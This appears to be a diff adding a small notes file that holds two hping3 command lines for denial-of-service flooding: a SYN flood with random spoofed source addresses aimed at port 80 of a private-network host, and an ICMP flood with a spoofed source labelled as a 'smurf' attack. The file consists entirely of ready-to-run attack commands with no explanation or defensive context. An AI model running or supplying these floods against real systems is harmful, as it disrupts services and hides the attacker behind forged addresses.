@@ -1,0 +1,6 @@
+hping3 --count 15000 --data 120 --syn --win 64 -p 80 --flood --rand-source 192.168.1.5
+
+Dos smurfs attack
+
+ 
+hping3 --icmp --count 15000 --spoof 192.168.1.68 192.168.1.5  --flood
